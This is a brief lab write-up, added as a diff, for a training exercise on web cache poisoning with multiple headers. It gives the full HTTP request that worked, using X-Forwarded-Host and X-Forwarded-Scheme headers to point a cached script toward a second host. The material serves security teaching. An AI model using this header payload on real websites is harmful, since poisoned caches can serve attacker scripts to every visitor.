@@ -1,0 +1,19 @@
+Web cache poisoning with multiple headers
+
+Once again we're dealing with user interaction, so this is a bit finnicky. Here's the request that worked for me:
+
+GET /resources/js/tracking.js HTTP/1.1
+Host: acc71fc91e6165be80fe6e72003500f4.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Forwarded-Host: ac0d1f8d1eba65a2801d6e480151009c.web-security-academy.net
+X-Forwarded-Scheme: http
+Connection: close
+Referer: https://acc71fc91e6165be80fe6e72003500f4.web-security-academy.net
+Cookie: session=sIpoMhDbeeACH11w0vCNcc6fDvl4800s
+Upgrade-Insecure-Requests: 1
+
+
+Good luck!
